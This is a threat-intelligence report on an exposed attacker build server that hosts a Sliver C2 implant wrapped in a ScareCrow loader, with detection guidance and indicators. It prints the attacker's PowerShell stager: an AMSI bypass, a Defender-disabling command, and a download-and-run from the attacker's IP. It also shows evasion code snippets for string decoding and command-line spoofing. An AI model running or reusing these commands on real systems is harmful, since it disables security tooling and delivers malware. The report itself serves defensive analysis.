---
title: "Open Directory Exposure: Sliver with ScareCrow Loader (45.94.31.220)"
date: '2026-03-01'
layout: post
permalink: /reports/sliver-open-directory/
category: "C2 Framework"
hide: true
---

A Comprehensive, Evidence-Based Guide for Security Decision-Makers

**Campaign Identifier:** WebServer-Compromise-Kit-45.94.31.220    
**Last Updated:** March 1, 2026

---

## BLUF (Bottom Line Up Front)

An exposed open directory at `45.94.31.220` — hosted on bulletproof infrastructure operated by 1337 Services GmbH (AS210558) — yielded a complete attacker build workspace containing 270 files, 69 subdirectories, and 144 MB of offensive tooling. The workspace includes a fully operational Sliver C2 implant wrapped in a ScareCrow loader with 15 layered EDR evasion techniques, custom source code for five evasion modules, a fraudulent VMware code-signing certificate with its unencrypted private key, and a Sliver beacon generation command revealing complete C2 configuration. The toolkit was built on 2026-02-14 at 15:01 UTC and discovered approximately 6.75 hours later — likely before successful victim deployment.

**Threat Category:** Cybercrime — HIGH confidence (80%). Designated **UTA-2026-001** *(an internal tracking label used by The Hunters Ledger — see Section 6)*.
**Threat Level:** MEDIUM — C2 infrastructure offline at analysis time; no confirmed victims; automated build pipeline means functionally equivalent beacons can be regenerated in approximately 8 minutes.
**Intelligence Type:** Descriptive (what was built) and Explanatory (how evasion works). Anticipatory intelligence is a documented gap — actual victim deployment and targeting remain unconfirmed.

> This assessment is based on: direct analysis of recovered build artifacts (build.log, source code, compiled binaries), static analysis, three dynamic analysis sessions, a 305-second behavioral sandbox run, and memory forensics. Confidence levels throughout distinguish confirmed findings from analytical judgments.

> **Key caveat:** File hashes for the primary samples are specific to the 2026-02-14 build. The automated build pipeline can regenerate polymorphically distinct but functionally identical beacons in approximately 8 minutes. Certificate-based and behavioral IOCs are more durable than hash-based atomic indicators.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/opendirectory.png" | relative_url }}" alt="Open directory listing at 45.94.31.220 port 8080 showing indexed files tagged with malware and exploit classifications by a third-party scanner">
  <figcaption><em>Figure 1: The exposed open directory at 45.94.31.220:8080 — already indexed and classified by a third-party open directory scanner before this analysis began. Note malware/exploit classifications applied to ScareCrow, Donut, and source modules visible in the listing.</em></figcaption>
</figure>

---

## 1. Executive Summary

### The Threat in Clear Terms

On 2026-02-14, a threat actor operating from a bulletproof VPS at `45.94.31.220` ran an automated build pipeline that produced a fully operational Sliver C2 implant wrapped inside a ScareCrow Go loader with 15 distinct EDR evasion techniques. Six hours and forty-five minutes later, the entire build workspace — including source code, build logs, compiled binaries, and an unencrypted private signing key — was indexed by an open-directory scanner Hunt.io. This report documents the resulting intelligence.

**What defenders gained from this exposure:** Implementation-level understanding of the attacker's complete toolchain — not just binary artifacts, but the source code, build logic, C2 configuration, and operational records that drive detection, hunting, and attribution. This depth of pre-deployment intelligence is rare and directly enables defensive action that would otherwise require full incident response engagement.

**What the attacker built:** A four-stage kill chain — PowerShell stager → ScareCrow-wrapped loader → Donut shellcode bootstrap → Sliver C2 beacon — designed to defeat endpoint detection at every layer. The loader targets `C:\Windows\System32\sihost.exe` for process hollowing (per build.log; injection target not live-confirmed in dynamic analysis) and beacons to `mailuxe.net:443`, `mailmassange.duckdns.org:443`, and `mailuxe.net:8443` using mutual TLS with an effective 90–510 second callback window (300-second base, 70% jitter) and a 2027-12-31 killswitch.

**What defenders can act on now:** The certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`, the SysWhispers3 hash seed `0x9DEA8D94`, the hardcoded PEB spoofing string `MicrosoftEdgeUpdate.exe --update-check --silent`, and the behavioral five-step process ghosting sequence are all detectable artifacts that survive polymorphic rebuilds.

### Risk Rating


| Risk Factor                    | Score      | Justification                                                                                                                                                         |
| ------------------------------ | ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **EDR Bypass Capability**      | 9/10       | HalosGate indirect syscalls bypass usermode hook telemetry; ETW patching blinds ETW-consuming EDRs; sleep masking eliminates memory signatures during dormancy        |
| **C2 Resilience**              | 8/10       | Three-endpoint random selection (primary, backup, fallback); mTLS channel; 70% jitter; 100 failure tolerance before self-termination; 2027 killswitch                 |
| **Detection Difficulty**       | 8/10       | Polymorphic builds; process hollowing into trusted Windows binary; PPID spoofing; call stack spoofing; fraudulent code signing; no persistence in loader              |
| **Post-Compromise Capability** | 8/10       | Full Sliver beacon: lateral movement, pivoting, credential access, file exfiltration, execution — operator-driven post-C2 establishment                               |
| **Infrastructure Risk**        | 6/10       | Bulletproof hosting (1337 Services GmbH / AS210558) with near-zero abuse response; C2 offline at analysis time reduces immediate threat                               |
| **Rebuild Velocity**           | 8/10       | Automated 5-phase build pipeline produces functionally equivalent beacon with new hashes in ~8 minutes; certificate serial is the only durable binary-level indicator |
| **OVERALL RISK**               | **7.8/10** | **HIGH — Sophisticated evasion stack with fully operational C2 capability; current MEDIUM threat level due to C2 offline and no confirmed victims**                   |


### Key Findings

1. **Complete attacker workspace exposed** — 270 files, 69 subdirectories, 144 MB including source code, build log, C2 configuration, compiled beacons, and an unencrypted RSA-2048 private signing key.
2. **15 EDR evasion techniques** active across the kill chain — 7 custom-implemented (SysWhispers3, call stack spoofing, process ghosting, Heaven's Gate, string obfuscation, VM checks, argument spoofing), 5 ScareCrow-delegated (PPID spoofing, ETW patching, AMSI patching, sleep masking, module stomping), 3 ScareCrow-native (entropy normalization, timestamp manipulation, code signing).
3. **Fraudulent VMware certificate with exposed private key** — Serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`; unencrypted `key.pem` means any third party who downloaded the key can sign arbitrary binaries with the VMware-impersonating identity.
4. **SysWhispers3 HalosGate indirect syscalls** — Six NT functions bypassed at the direct syscall level; EDRs relying solely on usermode ntdll hook telemetry are blind to process injection operations.
5. **Sliver C2 with three-endpoint resilience** — mTLS (mutual TLS, a two-way encryption and authentication protocol) beaconing to `mailuxe.net` and `mailmassange.duckdns.org`; random endpoint selection defeats single-domain blocking; 2027 killswitch indicates planned multi-year operation.
6. **Process hollowing into sihost.exe** (process hollowing is a technique where the malware hides itself inside a trusted Windows system process, making it invisible to detection tools) — process hollowing as the active injection mode is DEFINITE (XZ config header mode byte 0x04, confirmed in dynamic analysis); the `sihost.exe` target process is MODERATE confidence (75%) from build.log, not confirmed in live analysis. sihost.exe is a trusted Shell Infrastructure Host — outbound connections from it to non-Microsoft addresses are anomalous and high-value hunt leads regardless of which process the actual runtime target proves to be.
7. **Bulletproof hosting confirmed** — 1337 Services GmbH co-founders linked to DOJ Operation Talent (Cracked.to/Nulled.to seizure); threat intelligence feeds flag AS210558 as presumptively malicious infrastructure.
8. **Build pipeline fingerprint survives rebuilds** — SysWhispers3 hash seed `0x9DEA8D94`, stub/implemented module architecture, and the `MicrosoftEdgeUpdate.exe` PEB spoofing string are compiled constants detectable across polymorphic builds.
9. **Stager-loader skill gap** — The stager uses one of the most widely detected AMSI bypass techniques alongside a loader with advanced HalosGate indirect syscalls — a strong indicator of two-party development (access broker + sophisticated toolkit builder).
10. **Pre-deployment discovery** — Infrastructure indexed approximately 6.75 hours after build completion, likely before confirmed victim compromise.

---

## 2. Sample and Artifact Inventory

### Primary Analyzed Samples


| Filename             | SHA256                                                             | Size                        | Type                                  | Role                                                                                               |
| -------------------- | ------------------------------------------------------------------ | --------------------------- | ------------------------------------- | -------------------------------------------------------------------------------------------------- |
| **OneDriveSync.exe** | `e2ad6f8202994058cc987cc971698238c2dc63a951dd1e43063cc9b8b138713b` | 32,786,672 bytes (~31.3 MB) | PE64, signed (fraudulent VMware cert) | Primary beacon — ScareCrow-wrapped Sliver C2 implant; delivered via stager as `update.exe`         |
| **compressed.exe**   | `d94c74a6cd6629be66898eaab03ce0446f655689e28e08f0c166eaf4af9d04ea` | 15,869,168 bytes (~15.1 MB) | PE64, UPX 5.0.2 packed (LZMA,brute)   | Alternate delivery format — UPX-packed; unpacks to ~31.3 MB; same payload core as OneDriveSync.exe |


**MD5 / SHA1 for OneDriveSync.exe:** `9559366a6f6874ad914e308a34903c77` / `67bb390c2dad7ebd9e9f706a6f2ba42e4cbcbee7`
**MD5 / SHA1 for compressed.exe:** `f587753c0a46688af2ffea00573192e2` / `8f27695dfd4f29e872c1661cdf225120182dd05b`

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/unpacked-compressed.png" | relative_url }}" alt="UPX-packed compressed.exe unpacking, showing LZMA compression and packed binary analysis">
  <figcaption><em>Figure 2: Static analysis of compressed.exe confirming UPX 5.0.2 (LZMA) packing — the packed binary is functionally equivalent to OneDriveSync.exe once unpacked.</em></figcaption>
</figure>

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/original-files-name.png" | relative_url }}" alt="PE version information properties of OneDriveSync.exe showing the OriginalFilename field set to Excel.exe">
  <figcaption><em>Figure 3: PE version information for OneDriveSync.exe — the OriginalFilename field is set to Excel.exe, a build-time property embedded by ScareCrow during packaging. Triage tools and file property dialogs that read PE version info rather than the on-disk filename will display an Excel identity.</em></figcaption>
</figure>

### Additional Open Directory Artifacts


| Filename             | Approx. Size     | Role                                                                                                | Intelligence Value                                                                          |
| -------------------- | ---------------- | --------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| **Excel.exe**        | ~33 MB           | Second beacon — Microsoft Excel lure identity; same payload core, different social engineering skin | HIGH — parallel delivery vector; hash not recovered; C2 config may differ                   |
| **encoded.bin**      | 19,353,426 bytes | Pre-wrapper Sliver shellcode — raw shellcode before ScareCrow wrapping                              | HIGH — enables Sliver version and config extraction without full binary analysis            |
| **cert.pem**         | ~1 KB            | Fraudulent VMware, Inc. code-signing certificate (public cert)                                      | CRITICAL — certificate serial confirmed; all binaries from this pipeline identifiable       |
| **key.pem**          | ~1.7 KB          | PKCS#8 RSA private key — **unencrypted**                                                            | CRITICAL — third-party signing risk; anyone who downloaded this can sign binaries as VMware |
| **cert.pfx**         | ~3 KB            | Combined cert+key bundle (password-protected)                                                       | MODERATE — redundant given key.pem exposure                                                 |
| **stager.ps1**       | <1 KB            | PowerShell initial access delivery stager                                                           | CRITICAL — full source recovered; AMSI bypass + defender disable + download/exec            |
| **heavens_gate.bin** | 34 bytes         | Pre-assembled Heaven's Gate 32→64 transition stub — ready-to-inject binary shellcode                | HIGH — operational binary; direct injection artifact                                        |


### Source Code Modules


| Filename                                             | Size        | Implementation Status      | Function                                                                |
| ---------------------------------------------------- | ----------- | -------------------------- | ----------------------------------------------------------------------- |
| `syscalls.C` + `syscalls.h` + `syscalls-asm.x64.asm` | ~4 KB total | Fully implemented          | SysWhispers3 HalosGate indirect syscalls — 6 NT functions               |
| `stack_spoof.C`                                      | ~600 bytes  | Fully implemented          | Call stack spoofing — random return address overwrite                   |
| `string_obf.C`                                       | ~300 bytes  | Fully implemented          | XOR 0x42 runtime string decoding with stack-allocated buffers           |
| `vm_checks.C`                                        | ~300 bytes  | Fully implemented          | CPU core count and system uptime sandbox detection                      |
| `arg_spoof.C`                                        | ~500 bytes  | Fully implemented          | PEB CommandLine overwrite to MicrosoftEdgeUpdate identity               |
| `process_ghosting.c`                                 | ~2 KB       | Fully implemented          | Five-step process ghosting sequence (no SysWhispers3 coverage — gap)    |
| `heavens_gate.asm`                                   | 451 bytes   | Fully implemented          | NASM x86 far-return CS=0x23→0x33 transition                             |
| `module_stomp.C`                                     | ~100 bytes  | Stub — ScareCrow-delegated | Module stomping (implemented natively by ScareCrow)                     |
| `ppid_spoof.C`                                       | ~150 bytes  | Stub — ScareCrow-delegated | PPID spoofing (implemented natively by ScareCrow)                       |
| `sleep.mask.C`                                       | ~100 bytes  | Stub — ScareCrow-delegated | Sleep masking / shellcode encryption during dormancy                    |
| `etw_amsi_patch.c`                                   | 88 bytes    | Stub — ScareCrow-delegated | ETW patching + AMSI patching (implemented natively by ScareCrow)        |
| `build.log`                                          | ~3 KB       | Operational record         | Full build pipeline phases, C2 parameters, timestamps, injection target |
| `Sliver-command.txt`                                 | <1 KB       | Operational record         | Exact Sliver CLI beacon generation command with all configuration flags |


**What This Means:** The stub/implemented split is not an incomplete build. It is the correct architectural pattern for ScareCrow integration — ScareCrow provides the stub implementations at build time from its own codebase. The attacker's custom modules (syscalls.C, stack_spoof.C, etc.) extend ScareCrow with additional capabilities not present in the stock tool. This is a fully operational evasion stack.

> ANALYST NOTE: The files OneDriveSync.exe, Excel.exe, and compressed.exe all appear to look like the valid Excel icon when in the filesystem.

### Certificate IOCs


| Field                    | Value                                                                                               |
| ------------------------ | --------------------------------------------------------------------------------------------------- |
| **Subject CN**           | VMware, Inc. Code Signing                                                                           |
| **Subject Organization** | VMware, Inc.                                                                                        |
| **Subject Locality**     | Redmond, Washington, US (fraud indicator — VMware HQ is Palo Alto, CA; Redmond is Microsoft's city) |
| **Serial Number**        | `659EEB5AA4A489FB238993AF259D23F057F6D6D6`                                                          |
| **Issuer**               | Self-signed (issuer = subject)                                                                      |
| **Valid From / Until**   | 2026-02-14 15:01:32 UTC / 2027-02-14 15:01:32 UTC                                                   |
| **Key**                  | RSA 2048-bit; **unencrypted private key exposed in key.pem**                                        |
| **Subject Key Identifier** | `FAA285BD5632CC437D5E694588818 21E29485BF` — durable IOC; persists if the certificate is re-issued from the same RSA key pair; survives serial number regeneration |
| **CA:TRUE flag**         | Present — scripted openssl generation indicator; legitimate code-signing certs never carry CA:TRUE  |


**Third-Party Signing Risk:** Anyone who downloaded `key.pem` from the open directory before it was taken down can sign arbitrary binaries with the `VMware, Inc. Code Signing` identity. This means the certificate serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6` may appear on binaries not originating from UTA-2026-001 — creating potential false positives in investigations that assume all artifacts with this serial share a single origin.

---

## 3. Kill Chain Analysis

The kill chain runs through four stages from delivery to C2 establishment. Because the C2 infrastructure was offline during dynamic analysis, Stages 5–6 are reconstructed from build artifacts and behavioral analysis rather than live observation. Each stage is presented chronologically with available defender telemetry.

### Stage 0 — Attacker Build Pipeline (Pre-Victim)

**What happened:** On 2026-02-14 at 15:01:23 UTC, the attacker's automated build pipeline executed on `45.94.31.220` in working directory `/var/tmp/.cache-1f6a38a2-1771081283`. Five sequential phases ran over approximately eight minutes:

- **Phase 1 (15:01:23):** Installed Go 1.24.2; cloned and built ScareCrow, Donut, and SysWhispers3 from public repositories.
- **Phase 2 (15:01:32):** Generated the fraudulent RSA-2048 VMware code-signing certificate via scripted `openssl req -x509`. Certificate's `Valid From` timestamp (15:01:32) is 9 seconds after build start — a build timeline artifact.
- **Phase 3 (15:01:32):** Compiled 15 evasion modules (7 custom C/ASM, 5 stubs for ScareCrow delegation, 3 ScareCrow-native).
- **Phase 4 (15:01:32 – 15:08:34):** Called the Sliver C2 server to generate 19,353,426 bytes of raw shellcode. Shellcode generation took approximately 7 minutes.
- **Phase 5 (15:08:34+):** Applied ScareCrow polymorphic obfuscation — 2,558 sequential encrypted chunks — and signed the output with the fraudulent cert. Output: `OneDriveSync.exe` (~33 MB) hosted at `hxxp[:]//45.94.31[.]220:8000/`.

**Sliver beacon configuration (from Sliver-command.txt and build.log):**

```
C2 endpoints:   mailuxe.net:443, mailmassange.duckdns.org:443, mailuxe.net:8443
Selection:      Random (--strategy r)
Beacon name:    OneDriveSync
Injection:      C:\Windows\System32\sihost.exe
Callback:       300–900 seconds (70% jitter → effective 90–510 seconds)
Poll timeout:   900 seconds (max wait for server response per attempt)
Max failures:   100
Reconnect:      120 seconds
Killswitch:     2027-12-31 23:59:59
Canary:         intezer.com
```

**Defender opportunity:** The single-server architecture concentrates build server, C2 server, and payload delivery server on one IP. Blocking `45.94.31.220` (and monitoring `mailuxe.net`, `mailmassange.duckdns.org`) addresses multiple kill chain stages with one network control. The open directory scanner at port 8080 had already tagged ScareCrow, Donut, and source modules with malware/exploit classifications before this analysis began — demonstrating the value of continuous internet surface monitoring.

---

### Stage 1 — Initial Access: stager.ps1

> **Plain language:** The attacker's first move is to run a short script on the victim's computer that disables Windows security tools, downloads the main malicious program from the attacker's server, and quietly launches it. This script is the "delivery mechanism" — it prepares the ground before the real malware runs.

**What happens on the victim system:**

The victim executes `stager.ps1` through an undetermined delivery mechanism — no delivery artifact was recovered from the open directory. The stager performs three sequential actions:

**Action 1 — AMSI Bypass:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Uses .NET reflection to set `amsiInitFailed` to `true` in the PowerShell runtime assembly. This causes AMSI to report initialization failure, disabling content scanning for the session. This is one of the most widely detected AMSI bypass techniques in existence. Its presence alongside the sophisticated ScareCrow loader strongly suggests two different authors — a readily-available stager template and a custom-developed loader.

**Action 2 — Windows Defender Disable (admin-conditional):**

```powershell
try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}
```

Silent failure if insufficient privileges. If successful, triggers Windows Event ID 5001 in the Defender Operational log.

**Action 3 — Payload Download and Execute:**

```powershell
$url="http://45.94.31.220:8000/OneDriveSync.exe"
$p="$env:TEMP\update.exe"
(New-Object Net.WebClient).DownloadFile($url,$p)
Start-Process $p -WindowStyle Hidden
```

Downloads `OneDriveSync.exe` over unencrypted HTTP from port 8000. Writes to `%TEMP%\update.exe`. Executes hidden. The beacon lands on disk at this stage — a recoverable forensic artifact.

**Defender telemetry at Stage 1:**

- Sysmon EID 1: `powershell.exe` process creation
- Sysmon EID 3: outbound connection from `powershell.exe` to `45.94.31.220:8000`
- Sysmon EID 11: `powershell.exe` creating `update.exe` in `%TEMP%`
- PowerShell Script Block Logging (EID 4104): full stager content captured, including `amsiInitFailed` string
- Windows Defender EID 5001 (if admin-level execution)

---

### Stage 2 — Pre-Execution Checks: vm_checks.C

> **Plain language:** Once running, the loader program begins building the final malicious payload in memory — assembling thousands of small pieces into a complete program without ever writing it to the hard drive. This is specifically designed to avoid antivirus and security tools that look for suspicious files on disk.

`update.exe` starts and immediately runs two sandbox/VM detection checks before any other action:

**Check 1 — CPU core count:** `GetSystemInfo()` → if `dwNumberOfProcessors < 2` → silent exit.

**Check 2 — System uptime:** `GetTickCount()` (dynamically resolved at runtime — absent from PE import table) → if result `< 600,000 ms` (10 minutes) → silent exit.

**Check 3 — Canary domain:** The embedded Sliver canary `intezer.com` performs a network-level check — if DNS resolution produces responses consistent with Intezer's sandbox infrastructure, the beacon aborts.

**Defender note:** `GetTickCount` being absent from the import table defeats static import-table-based detection signatures for this specific function. The canary mechanism is more sophisticated than the CPU/uptime checks — it demonstrates awareness of specific analysis platforms.

---

### Stage 3 — Runtime String Decoding: string_obf.C

> **Plain language:** Throughout execution, the loader decodes hidden text strings on the fly using a simple scrambling technique. This keeps C2 server addresses, file paths, API names, and the injection target name invisible to security tools that scan programs for suspicious text — the strings only exist in readable form for a fraction of a second during execution.

Throughout execution, XOR-encoded strings are decoded on-demand:

```c
char* DecodeString(const char* enc, size_t len) {
    char* dec = (char*)_alloca(len + 1);
    for(size_t i = 0; i < len; i++) dec[i] = enc[i] ^ 0x42;
    dec[len] = '\0';
    return dec;
}
```

Key `0x42` (ASCII 'B'). Decoded buffers are stack-allocated via `_alloca()` — automatic cleanup on function return, no heap artifacts. This keeps C2 domain names, registry paths, API names, and the injection target (`sihost.exe`) out of static string analysis tools.

**What This Means:** The XOR key `0x42` is trivially reversible by any analyst or automated tool (FLOSS, CAPA). Its value is against automated pipeline scanners, not dedicated analysts. The `_alloca` stack allocation is a more deliberate forensic-evasion choice — heap-based memory forensics will not recover decoded strings, only stack-based forensics during active function execution.

---

### Stage 4 — Process Masquerading

> **Plain language:** The implant hides inside a legitimate Windows process so it appears to belong there.

Two operations disguise the loader's identity before injection:

**PPID Spoofing (ScareCrow-delegated):** `update.exe` is created with a spoofed parent PID using `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`, causing it to appear as a child of a legitimate Windows process (likely `explorer.exe` or `svchost.exe`) rather than PowerShell. DEFINITE confirmation: hollow target is invisible in behavioral sandbox (Noriben) descendant tracking and memory forensics tool (Volatility) `windows.pstree` across all three analysis sessions.

**Argument Spoofing (arg_spoof.C):**

```c
PPEB pPeb = (PPEB)__readgsqword(0x60);
WCHAR fakeArgs[] = L"MicrosoftEdgeUpdate.exe --update-check --silent";
memcpy(pPeb->ProcessParameters->CommandLine.Buffer, fakeArgs, cmdLineLen);
```

Overwrites the PEB CommandLine field directly. Task Manager, Sysmon EID 1, and EDR process trees display the spoofed Microsoft Edge updater identity. The binary on disk remains `update.exe`, but the in-memory process appears to be a legitimate Microsoft component.

**Defender note:** The hardcoded string `MicrosoftEdgeUpdate.exe --update-check --silent` is a fixed detection opportunity — every binary from this build pipeline presents the same fake identity. Detection: compare the claimed process path against the actual on-disk binary path. A mismatch between `MicrosoftEdgeUpdate.exe` and `%TEMP%\update.exe` is a high-confidence indicator. PPID spoofing is detectable via process creation monitoring that captures the actual `lpAttributeList` parent specification at `CreateProcess` time — kernel-level EDRs see through this.

---

### Stage 5 — Shellcode Staging and Injection (ScareCrow Loader Core)

> **Plain language:** An open-source tool bridges the loader to the final implant, running it entirely in memory without touching the hard drive.

This is the most technically complex stage. Three interactive debugger (x64dbg) dynamic sessions and disassembler (Binary Ninja) static analysis characterize it as a two-stage injection architecture.

**Sub-stage 5a — ScareCrow Polymorphic Loader:**

The loader function (61 KB, 2,558 sequential call instructions) decodes Sliver shellcode from encrypted chunks embedded inline in the binary. Each call passes a ~451-byte encrypted blob to the per-chunk decoder. The XOR key `0x42` appears at offset `0x58de8f`. Decoded output is assembled into a contiguous buffer.

**Sub-stage 5b — XZ Config Header Mode Dispatch:**

The ScareCrow loader uses byte 7 of the XZ stream header as an injection mode selector. Go build metadata embedded in the binary confirms the `ulikunitz/xz` library is the XZ parsing dependency — directly linking the loader's XZ handling to its open-source origin. Confirmed by dynamic analysis Session 3:

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/githublink.png" | relative_url }}" alt="Go build metadata extracted from OneDriveSync.exe showing the ulikunitz/xz GitHub library reference embedded in the binary">
  <figcaption><em>Figure 4: Go build metadata embedded in OneDriveSync.exe referencing the ulikunitz/xz library — the open-source XZ parsing dependency used by the ScareCrow loader to read the XZ stream header that controls injection mode selection.</em></figcaption>
</figure>

```
XZ header at 0xC000708000:
Bytes 0-5:  FD 37 7A 58 5A 00   (XZ magic)
Byte  6:    00                   (Stream flags)
Byte  7:    04                   (MODE BYTE = 0x04 = PROCESS HOLLOWING)
Bytes 8-11: E6 D6 B4 46          (CRC32 — valid)
```

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/xz-stream-header-parser.png" | relative_url }}" alt="Interactive debugger view showing XZ stream header byte 7 (0x04) identified as the process hollowing mode selector in the ScareCrow loader">
  <figcaption><em>Figure 5: Debugger session confirming XZ header byte 7 = 0x04 (process hollowing) — the mode dispatch mechanism that selects the active injection technique from the ScareCrow loader's built-in injection table.</em></figcaption>
</figure>

Mode dispatch table at BSS base `0x231BC40`:

- `0x00` = self-injection
- `0x01` = remote thread
- `0x04` = **process hollowing** (ACTIVE — DEFINITE)
- `0x0a` = module stomping

**Sub-stage 5c — Donut Shellcode Execution:**

> **Plain language:** Donut is an open-source tool that wraps a normal Windows program into a format that can run entirely inside computer memory without touching the hard drive. Here it acts as the bridge between the loader and the final Sliver implant, decompressing and launching the payload invisibly inside a legitimate Windows process.

An 18.4 MB anonymous private memory region (VadS, ERW→ER post-write) is allocated. The Sliver shellcode, wrapped in a Donut bootstrap, is written and executed. Dynamic analysis confirmed:

- RIP at allocation base + 0x59 (Donut VEH bootstrap entry)
- First bytes at RIP: `0x9A` (intentionally invalid CALLF opcode) — Donut uses a Vectored Exception Handler to catch the `#UD` exception and redirect execution. This is an anti-analysis technique.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/donut-vad-info.png" | relative_url }}" alt="Volatility VAD information output showing the 18.4 MB anonymous VadS region with ERW to ER permission transition, confirming Donut shellcode staging region in the OneDriveSync.exe process">
  <figcaption><em>Figure 6: Volatility VAD region details for the Donut staging allocation — the ERW→ER permission transition (write-then-execute) and VadS (anonymous private) type are the definitive indicators of shellcode injection rather than a mapped file or image section.</em></figcaption>
</figure>

The Donut instance at `base+0x200` contains:

- AES-128 master key (offset +0x00): `19 72 1F E6 E3 B0 CF 0C 32 0B 93 E0 C2 BE 91 1A`
- AES-128 nonce/counter (offset +0x10): `EA 2A 1C 5A 8D E1 33 7B DA 31 47 65 40 51 D0 89`
- Encrypted content from offset +0x1350: Sliver PE (AES-128-CTR encrypted)

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/veh-trap.png" | relative_url }}" alt="Debugger view of the Donut VEH bootstrap trap showing the 0x9A invalid CALLF opcode at the Donut entry point and the Vectored Exception Handler catching the resulting illegal instruction exception">
  <figcaption><em>Figure 7: Debugger capture of the Donut VEH bootstrap trap — the intentionally invalid 0x9A (CALLF) opcode at RIP triggers an Illegal Instruction (#UD) exception that the Vectored Exception Handler catches and redirects into the Donut decryption and execution path. This is a deliberate anti-analysis technique.</em></figcaption>
</figure>

The C2 IP and port are embedded inside the AES-encrypted Donut section — not recovered during dynamic analysis (C2 was offline before the beacon established a connection). Offline decryption using the recovered key/nonce is feasible via memory forensics tool extraction.

**Sub-stage 5d — Process Hollowing of sihost.exe:**

The Donut bootstrap decompresses and reflectively loads the Sliver PE in memory. Sliver then performs process hollowing of the target process. Build log confirms intended target: `C:\Windows\System32\sihost.exe`.

Evidence for process hollowing having occurred:

- `STATUS_CONFLICTING_ADDRESSES` (C0000018) in debugger — attempted allocation at target process base address
- `SetEvent` and `RtlCopyMemory` in Donut call stack — hallmarks of suspended process + image write
- Hollow target invisible in behavioral sandbox descendant tracking — PPID spoofing confirmed (DEFINITE)
- Zero child processes attributed to OneDriveSync.exe PID 3488 in memory forensics tool `windows.pstree`

**What This Means:** The three-layer injection (ScareCrow → Donut → Sliver) means defenders face three distinct decryption/deobfuscation layers before reaching usable intelligence about C2 configuration. The AES-128-CTR key material recovered from dynamic analysis provides a path to offline decryption of the Donut instance — enabling Sliver C2 IP recovery without requiring a live C2 server.

---

### Stage 6 — C2 Beacon Operation (Sliver Implant in sihost.exe)

> **Plain language:** Once established, the Sliver implant "phones home" to the attacker's server at regular intervals to receive instructions. The communication is encrypted and timed to look like normal background network traffic, making it difficult to distinguish from legitimate activity without specific behavioral detection.

**Status:** C2 infrastructure confirmed offline as of 2026-02-27. Three independent data sources confirm: no TCP SYN in 305-second behavioral sandbox run; no external connections; memory forensics tool `windows.netscan` shows zero results.

**Configured beacon behavior (from build artifacts, not live observation):**


| Parameter          | Value                                                       |
| ------------------ | ----------------------------------------------------------- |
| Primary C2         | `mailuxe.net:443` (HTTPS/mTLS)                              |
| Backup C2          | `mailmassange.duckdns.org:443` (HTTPS/mTLS)                 |
| Fallback C2        | `mailuxe.net:8443` (HTTPS/mTLS)                             |
| Selection          | Random — blocking one endpoint does not disrupt beaconing   |
| Callback interval  | 300–900 seconds base; 70% jitter (effective 90–510 seconds) |
| Failure tolerance  | 100 consecutive failures before self-termination            |
| Poll timeout       | 900 seconds (maximum wait for C2 server response per callback attempt) |
| Reconnect interval | 120 seconds between attempts                                |
| Killswitch         | 2027-12-31 23:59:59                                         |


<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/fallback-config-blob.png" | relative_url }}" alt="Memory view of the Sliver C2 fallback configuration blob recovered during dynamic analysis, showing the C2 endpoint and beacon configuration data">
  <figcaption><em>Figure 8: Sliver C2 fallback configuration blob recovered from memory during dynamic analysis — the configuration data visible here corroborates the C2 endpoints, beacon interval, and operational parameters documented in Sliver-command.txt and build.log.</em></figcaption>
</figure>

**Sleep masking (ScareCrow):** During the dormancy window, the beacon's shellcode region is encrypted in memory. Memory scanners running during dormancy find no executable anonymous memory. The shellcode is decrypted only when active.

**Call stack spoofing (stack_spoof.C):** Outbound calls appear to originate from `BaseThreadInitThunk`, `RtlUserThreadStart`, or `Sleep` — legitimate Windows call origins. EDR call-chain inspection sees a plausible-looking stack.

**No persistence:** Confirmed by behavioral sandbox (zero registry writes by sample PID 3488, 305-second run) and memory forensics tool (no persistence keys). Persistence is almost certainly (90% confidence) an operator action taken interactively through the Sliver C2 channel after first successful beacon — not automated.

---

## 4. Evasion Techniques

This section documents all 15 evasion techniques in the toolkit. Each technique includes implementation details, defender impact, and detection approach. Techniques are organized by implementation source.

### 4.1 Custom-Implemented Techniques

---

#### Technique 1: SysWhispers3 HalosGate Indirect Syscalls

> **Plain language:** Most security tools intercept communications between programs and the Windows operating system to detect suspicious behavior. This technique bypasses that interception entirely by talking directly to the Windows kernel — the core of the OS — using its internal numbered codes rather than the monitored communication channels. Security tools that rely solely on monitoring those channels are completely blind to what the malware is doing.

**Files:** `syscalls.C`, `syscalls.h`, `syscalls-asm.x64.asm`
**Composite Score: 9/10 — Highest impact evasion in the toolkit**
**MITRE ATT&CK:** T1106 (Native API)
**Confidence:** DEFINITE

**How it works:** Three-file unit implementing HalosGate-style syscall resolution with MASM x64 assembly stubs. Six NT functions are wrapped:

- `Sw3NtAllocateVirtualMemory` (hash `0x007957369`)
- `Sw3NtProtectVirtualMemory` (hash `0x0018A1519`)
- `Sw3NtCreateThread` (hash `0x0BC15E6AB`)
- `Sw3NtWriteVirtualMemory` (hash `0x08E10F8FC`)
- `Sw3NtOpenProcess` (hash `0x0911B9A84`)
- `Sw3NtQueueApcThread` (hash `0x01B3DD70D`)

